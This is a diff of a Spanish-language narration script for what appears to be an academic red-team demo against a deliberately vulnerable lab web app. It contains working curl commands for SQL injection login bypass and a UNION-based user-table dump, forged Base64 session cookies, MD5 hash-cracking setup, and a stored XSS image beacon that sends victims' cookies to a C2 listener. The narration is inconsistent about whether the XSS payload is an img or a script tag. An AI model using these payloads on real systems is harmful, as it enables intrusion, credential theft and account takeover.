@@ -17,7 +17,7 @@
   ```bash
   ffuf -u http://192.168.56.20:4000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,401,403,405 -t 10
   ```
-* 🗣️ **Lo que dices mientras se ejecuta en pantalla:**
+* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
   > *"Saludos. Iniciamos la demostración del Red Team con la Fase I: Reconocimiento. Sin recurrir a escáneres masivos de vulnerabilidades, utilizamos la herramienta `ffuf` para realizar un fuzzing controlado sobre el servidor en `192.168.56.20:4000`. Como ven en pantalla, las respuestas HTTP descubren con precisión los endpoints activos de la API: `/api/login`, `/api/register`, `/api/search` y `/api/message`."*
 
 ---
@@ -31,7 +31,7 @@
        -H "Content-Type: application/json" \
        -d '{"username": "usuario_prueba", "password": "password123"}'
   ```
-* 🗣️ **Lo que dices mientras das Enter y aparece `201 Created`:**
+* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
   > *"Para estudiar la aplicación sin atacarla aún, interactuamos legítimamente con `/api/register` creando un usuario de pruebas. El backend en Express nos confirma con un código `HTTP 201 Created` que la cuenta fue registrada exitosamente."*
 
 ---
@@ -45,7 +45,7 @@
        -H "Content-Type: application/json" \
        -d '{"username": "usuario_prueba", "password": "password123"}'
   ```
-* 🗣️ **Lo que dices mientras resalta la cabecera `Set-Cookie`:**
+* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
   > *"Ahora nos autenticamos enviando una petición POST a `/api/login`. Al incluir la bandera `-i`, capturamos la respuesta del servidor donde resaltamos la cabecera `Set-Cookie`. Vemos que el servidor nos asigna una cookie de sesión llamada `session` con un valor codificado."*
 
 ---
@@ -57,7 +57,7 @@
   ```bash
   echo "eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoidXN1YXJpb19wcnVlYmEiLCJyb2xlIjoidXNlciJ9" | base64 -d
   ```
-* 🗣️ **Lo que dices mientras aparece el JSON `{"userId":2,"username":"usuario_prueba","role":"user"}`:**
+* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
   > *"Al decodificar la cookie con `base64 -d`, obtenemos el objeto JSON en texto plano. Esto nos permite diagnosticar dos fallas de la categoría **OWASP A04:2025 Fallas Criptográficas**: primero, **CWE-311 (Falta de Cifrado)**, ya que los datos de sesión viajan en Base64 sin cifrar; y segundo, **CWE-345 (Verificación Insuficiente de Autenticidad)**, pues la cookie no incluye una firma digital ni token HMAC que garantice su integridad."*
 
 ---
@@ -74,7 +74,7 @@
   echo "{\"username\": \"' OR 1=1 /*\", \"password\": \"x\"}" > payload_sqli.json
   cat payload_sqli.json
   ```
-* 🗣️ **Lo que dices mientras tipeas el comando y muestras el archivo `payload_sqli.json`:**
+* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
   > *"Pasamos a la Fase II: Armamento. Para la vulnerabilidad **OWASP A05:2025 Inyección (CWE-89)**, preparamos el archivo `payload_sqli.json`. El backend procesa la consulta de autenticación concatenando directamente el parámetro `username`. Construimos un payload de inyección SQL `' OR 1=1 /*` que inyecta una tautología lógica. El delimitador `/*` (comentario en bloque) anula la verificación sintáctica restante. Al procesarse, la cláusula `WHERE` se evalúa siempre como verdadera (`TRUE`), neutralizando la verificación de contraseña y permitiendo el acceso no autorizado como primer usuario del sistema."*
 
 ---
@@ -87,7 +87,7 @@
   echo -n '{"userId":1,"username":"usuario_prueba","role":"user"}' | base64 -w 0 > cookie_adulterada.txt
   cat cookie_adulterada.txt
   ```
-* 🗣️ **Lo que dices mientras ejecutas el comando y ves la cadena en pantalla:**
+* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
   > *"Para explotar **CWE-345**, construimos el arma de suplantación de identidad. Alteramos el objeto JSON cambiando el `userId` del usuario estándar `2` al identificador `1`, correspondiente al primer usuario de la base de datos. Lo codificamos a Base64 con la CLI y guardamos el resultado en `cookie_adulterada.txt`, listo para inyectarse en la cabecera HTTP."*
 
 ---
@@ -100,7 +100,7 @@
   echo "0192023a7bbd73250516f069df18b500" > target_hash.txt
   ls -lh /usr/share/wordlists/rockyou.txt 2>/dev/null || ls -lh /usr/share/wordlists/rockyou.txt.gz
   ```
-* 🗣️ **Lo que dices mientras ejecutas ambos comandos:**
+* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
   > *"Para vulnerar las credenciales que exfiltraremos de la base de datos, armamos el entorno de análisis sobre **CWE-327 (MD5 Obsoleto)**, **CWE-759 (MD5 sin Sal)** y **CWE-916 (Esfuerzo Criptográfico Insuficiente)**. Guardamos el hash de prueba en `target_hash.txt` y verificamos la disponibilidad de nuestro diccionario en Kali Linux para ser procesado con Hashcat en modo `-m 0`."*
 
 ---
@@ -115,7 +115,7 @@
   EOF
   cat payload_xss.json
   ```
-* 🗣️ **Lo que dices mientras tipeas y muestras `payload_xss.json`:**
+* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
   > *"Finalmente, para la vulnerabilidad **OWASP A05:2025 Stored XSS (CWE-79 y CWE-116)**, creamos el archivo `payload_xss.json`. Como el navegador bloquea etiquetas `<script>` inyectadas a través de `innerHTML`, diseñamos una etiqueta `<img>` rota que, al fallar, ejecuta el evento `onerror` y enviará asíncronamente la cookie de la víctima usando un `Image Beacon` hacia nuestro listener C2 en `192.168.56.10:8888`, evadiendo así las políticas CORS. Con esto completamos el armamento de nuestros vectores."*
 
 ---
@@ -139,7 +139,7 @@
        -H "Content-Type: application/json" \
        -d @payload_sqli.json
   ```
-* 🗣️ **Lo que dices mientras ejecutas el comando y se recibe el `HTTP 200 OK`:**
+* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
   > *"Iniciamos la Fase III: Entrega. La transmisión de nuestros vectores maliciosos se orquesta de manera manual, eludiendo escáneres.*  
   > *En este primer paso, ajustamos nuestro vector de Inyección SQL para usar el delimitador `/*` (comentario en bloque) y lo enviamos hacia `/api/login`. Al llegar al servidor, el middleware `express.json()` lo procesa e inyecta directamente en la consulta del backend sin sanitización, logrando el bypass de autenticación instantáneo y emitiendo una cookie válida de administrador."*
 
@@ -153,7 +153,7 @@
   COOKIE_VAL=$(cat cookie_adulterada.txt) && curl -i -X GET http://192.168.56.20:4000/api/profile \
        -H "Cookie: session=$COOKIE_VAL"
   ```
-* 🗣️ **Lo que dices mientras ejecutas el comando y ves la respuesta en pantalla:**
+* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
   > *"Continuando con la entrega, inyectamos la cookie adulterada (donde suplantamos el `userId` por `1`) directamente dentro de las cabeceras HTTP de la petición GET hacia `/api/profile`.*  
   > *Como el servidor carece de verificación de integridad HMAC (CWE-345), la cabecera es procesada limpiamente por el backend, demostrando la entrega exitosa del vector de suplantación y confirmando nuestra identidad como administrador."*
 
@@ -172,7 +172,7 @@
        -H "Cookie: session=$COOKIE_VAL" \
        -d @payload_xss.json
   ```
-* 🗣️ **Lo que dices mientras ejecutas el comando y sale `HTTP 200 OK`:**
+* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
   > *"Finalmente, entregamos el vector de Stored XSS transmitiendo el cuerpo JSON hacia el endpoint de mensajería interna `/api/message`.*  
   > *La etiqueta `<script>` con el código malicioso viaja directamente en la propiedad `content`. El servidor procesa y almacena este contenido en la base de datos sin aplicar filtros de entrada ni escape de caracteres (CWE-79), completando exitosamente la entrega de todos nuestros vectores de ataque."*
 
@@ -192,7 +192,7 @@
        -H "Cookie: session=$COOKIE_VAL" \
        -d '{"query": "'\'' UNION SELECT username, password, email FROM users--"}'
   ```
-* 🗣️ **Lo que dices en la narración del video:**
+* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
   > *"Pasamos a la Fase IV: Explotación. En esta etapa se materializan las fallas estructurales derivadas de la programación insegura.*  
   > *Respecto a **CWE-89 (Inyección SQL)**, el backend desarrollado en Node.js concatena los payloads inyectados directamente dentro de las directivas de SQLite sin emplear parametrización ni consultas preparadas. Esto altera de forma directa el árbol de ejecución lógico del motor relacional `better-sqlite3`.*  
   > *Como pueden apreciar en pantalla, al ejecutar la búsqueda inyectada en `/api/search`, logramos forzar al motor de base de datos a retornar los registros completos de la tabla de usuarios, incluyendo nombres, correos y hashes de contraseñas."*
@@ -207,7 +207,7 @@
   curl -i -X GET http://192.168.56.20:4000/api/profile \
        -H "Cookie: session=$COOKIE_VAL"
   ```
-* 🗣️ **Lo que dices en la narración del video:**
+* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
   > *"En relación con **CWE-345 (Verificación Insuficiente de Autenticidad)** y **CWE-311 (Falta de Cifrado)**, el middleware de autorización del servidor valida a ciegas el estado de la sesión presente en la cookie.*  
   > *Al enviar la cookie adulterada en Base64, el servidor lee el objeto JSON sin verificar su integridad, debido a la ausencia total de un Código de Autenticación de Mensajes basado en Hash (HMAC).*  
   > *Como observan en el cuerpo de la respuesta, el backend procesa la petición y nos otorga acceso completo a los datos del usuario ID 1 (`admin`), confirmando la materialización de la falla arquitectónica en la gestión de sesiones."*
@@ -226,7 +226,7 @@
   sqlite3 vulnapp.db "SELECT id, content FROM messages WHERE id=(SELECT max(id) FROM messages);"
   ```
   *(Nota para el video: Asegúrate de estar posicionado en el directorio `vulnapp/vulnerable` antes de ejecutar el comando, ya que ahí se encuentra la base de datos real con los registros inyectados)*
-* 🗣️ **Lo que dices en la narración del video:**
+* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
   > *"Entramos en la Fase V: Instalación. En esta etapa, consolidamos la persistencia dentro del entorno vulnerado.*  
   > *Como pueden observar al consultar directamente el archivo de la base de datos relacional, el payload XSS que entregamos en la fase anterior se ha inscrito de manera definitiva y permanente.*  
   > *La total ausencia de codificación de salida o sanitización en el backend permite este almacenamiento letal. Más grave aún, el uso de la propiedad insegura `innerHTML` en el frontend (incurriendo en **CWE-79** y **CWE-116**) garantiza que este código parasitario se descargue del servidor y se despliegue recurrentemente, ejecutándose en el navegador de cualquier víctima legítima que interactúe con el panel de mensajes del sistema."*
@@ -244,7 +244,7 @@
   ```bash
   python3 -m http.server 8888
   ```
-* 🗣️ **Lo que dices en la narración del video:**
+* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
   > *"Avanzamos a la Fase VI: Comando y Control (C2). Aquí establecemos un canal de exfiltración pasivo.*  
   > *Levantamos un servidor de escucha en nuestra máquina atacante Kali Linux mediante Python. El Worm XSS que dejamos incrustado en la base de datos utiliza el Event Handler `onerror` de una etiqueta de imagen rota para realizar un bypass de las restricciones de `innerHTML`.*  
   > *Este Image Beacon obliga al navegador vulnerado a enviar peticiones automatizadas, entregando las cookies de sesión robadas directamente a nuestro control de manera silenciosa, efectiva, y evadiendo las políticas de CORS de los navegadores modernos."*
@@ -258,7 +258,7 @@
 ### PASO 7.1: Vulneración Absoluta y Cierre de la Fase Ofensiva
 
 * 🖥️ **Acción Visual:** Se muestran brevemente en pantalla los resultados combinados de la intrusión: los hashes extraídos (fase 4), la captura de cookies (fase 6) y el acceso a la cuenta del administrador.
-* 🗣️ **Lo que dices en la narración del video:**
+* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
   > *"Finalmente, entramos en la Fase VII: Acciones sobre los Objetivos. El ciclo culmina con la vulneración absoluta de los pilares de Confidencialidad, Integridad y Disponibilidad.*  
   > *Como equipo ofensivo (Red Team), logramos la evasión del mecanismo de autenticación y la extracción íntegra de la base de datos, exponiendo contraseñas almacenadas bajo un algoritmo obsoleto, evidenciando **CWE-759** y **CWE-916**.*  
   > *Paralelamente, concretamos un Secuestro de Cuentas a escala global (Account Takeover), logrando acceso irrestricto y cumpliendo exitosamente con los objetivos destructivos de la intrusión. Finalizamos la demostración del ataque y cedemos el paso a la respuesta de incidentes."*
